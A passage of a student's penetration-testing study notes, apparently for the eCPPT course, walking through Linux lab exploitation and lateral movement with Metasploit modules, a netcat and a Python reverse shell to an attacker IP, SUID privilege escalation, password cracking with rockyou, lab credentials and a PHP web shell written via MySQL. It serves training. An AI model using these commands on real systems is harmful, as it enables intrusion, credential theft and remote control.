+</code></pre></div></div>
+
+<p>// https://www.exploit-db.com/exploits/21848/
+// its potentially vulnerable to a <strong>udev</strong> exploit</p>
+
+<h4 id="msf-in-action">msf in action</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploi	t/linux/local/udev_netlink
+set session 1
+set other options
+run
+// we have shell with root access
+</code></pre></div></div>
+
+<h3 id="exploiting-samba-server">Exploiting Samba server</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lets go back as user todd
+smbd --version
+</code></pre></div></div>
+
+<p>// Samba version: 3.0.20-Debian
+  // look into the /etc/samba/smb.conf
+  // We find that its configured with an option that allows reading of the root file system via Symlink Directory Traversal Vulnerability, specifically, the <strong>wide links=yes</strong> option.</p>
+
+<blockquote>
+  <p>we can use a msf module to exploit that</p>
+</blockquote>
+
+<h4 id="exploit-with-msf">exploit with msf</h4>
+<p>msf:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/admin/smb/samba_symlink_traversal
+set rhost 172.16.80.22
+set smbshare tmp
+run
+</code></pre></div></div>
+
+<blockquote>
+  <p>Now access the following share to browser the root filesystem: \mercury\tmp\rootfs</p>
+</blockquote>
+
+<h4 id="access-the-share">access the share</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -N \\\\172.16.80.22\\tmp -U ""
+ // we should get access
+cd rootfs
+ls
+cd etc
+get passwd
+// its done
+</code></pre></div></div>
+
+<h3 id="remotely-exploitable-vulnerability-on-a-web-server-port">Remotely exploitable vulnerability on a web server port.</h3>
+<ul>
+  <li>
+    <p>open the browser on port 80</p>
+  </li>
+  <li>
+    <p>lets run dirsearch, to find any web directories</p>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./dirsearch.py -u http://172.16.80.22/ -e cgi -r -f
+   // -r = recursive // -f = force // -e = extension
+   /cgi-bin/calender.cgi
+</code></pre></div></div>
+
+<h4 id="msf-again">msf again</h4>
+<p>// knowing that CGI programs, in particular, are of primary concern in regards to shellshock vulnerabilities, we use metasploit <strong>apache_mod_cgi_bash_env</strong> module to check For exploitability, making sure to configure the correct options, including the TARGETURI value:</p>
+
+<p>use auxiliary/scanner/http/apache_mod_cgi_bash_env</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set options
+set targeturi cgi-bin/calendar.cgi
+set cmd "/bin/nc &lt;attacker_IP&gt; 1234 -e /bin/sh"
+</code></pre></div></div>
+
+<blockquote>
+  <p>open a listener and run, we have a shell as www-data</p>
+</blockquote>
+
+<h4 id="upgrade-the-shell-as-usual">upgrade the shell as usual</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'import pty; pty.spawn("/bin/sh")'
+export TERM=xterm
+</code></pre></div></div>
+
+<h4 id="search-for-suid-root-executables">search For SUID root executables</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -4000 2&gt;/dev/null
+</code></pre></div></div>
+
+<p>// we found that nmap is available</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --interactive
+!sh
+
+</code></pre></div></div>
+
+<blockquote>
+  <p>we have root access</p>
+</blockquote>
+
+<h2 id="lab-4----linux-exploitation---lateral-movement">Lab 4 -  Linux Exploitation - Lateral Movement</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Netblock: 172.16.80.1/24
+
+Domain: robotstogo.localdomain
+</code></pre></div></div>
+
+<h3 id="enumerate-nfs-shares">Enumerate NFS shares</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap --script nfs-ls 172.16.80.27
+</code></pre></div></div>
+
+<h4 id="crack-the-zip-password">Crack the .zip password</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt backup.zip 
+</code></pre></div></div>
+
+<ul>
+  <li>found file <strong>notes.txt</strong>, (size cp/uc     69/    57, flags 9, chk a1f0)</li>
+  <li>checking pw KAWANNAT</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PASSWORD FOUND!!!!: pw == "====0open/n"
+</code></pre></div></div>
+
+<h4 id="open-the-zip-file-with-the-password">open the zip file with the password</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unzip -P '====0open/n' backup.zip 
+	TEMP MGMT CONSOLE:
+	https://172.16.80.24:4433/xl0827_dev_
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="sh">'</span><span class="s">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="sh">"</span><span class="s">&lt;ATTACKER_IP&gt;</span><span class="sh">"</span><span class="s">,&lt;ATTACKER_PORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">-i</span><span class="sh">"</span><span class="s">]);</span><span class="sh">'</span>
+
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=tomcatadmin&amp;pw=0x19$2B7!
+amanda: M@ndy857#
+</code></pre></div></div>
+
+<h3 id="find-suid-files">Find SUID files</h3>
+<ul>
+  <li>we can execute catme as root</li>
+  <li>so we will copy the /etc/passwd and /etc/shadow to our machine</li>
+</ul>
+
+<h4 id="cracking">cracking</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unshadow passwd shadow &gt; forJohn
+john forJohn -w=/usr/share/wordlists/rockyou.txt
+james:159357
+damien:secuirty3
+</code></pre></div></div>
+
+<blockquote>
+  <p>btw, rockyou did not have this password, thats a bold move ma boi
+my fasttrack is not working, so i could not crack with rockyou</p>
+</blockquote>
+
+<p>// now we can log into 172.61.80.27 via SSH with damien access
+// damien has root access, so with a simple sudo bash we are root</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /home/auditor/.bash_history
+run autoroute -s 192.3.178.0/24
+portfwd add -l 1234 -p 80 -r 192.3.178.3
+portfwd list
+mysql -h 192.3.178.3 -u root -pfArFLP29UySm4bZj
+SELECT '&lt;?php echo system($_GET["cmd"]); ?&gt;' into DUMPFILE '/var/www/html/webtemp/backdoor.php';
+</code></pre></div></div>
+
+<p>→ http://localhost:1234/webtemp/backdoor.php?cmd=whoami</p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#begginer" class="page__taxonomy-item" rel="tag">begginer</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ecppt" class="page__taxonomy-item" rel="tag">ecppt</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-11-22T00:00:00+06:00">November 22, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=4+-+Linux+Security%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fecppt%2Flinux%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fecppt%2Flinux%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fecppt%2Flinux%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/ecppt/powershell/" class="pagination--pager" title="3 - Powershell
+">Previous</a>
+    
+    
+      <a href="/notes/ecppt/webapp/" class="pagination--pager" title="5 - Web App Security
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
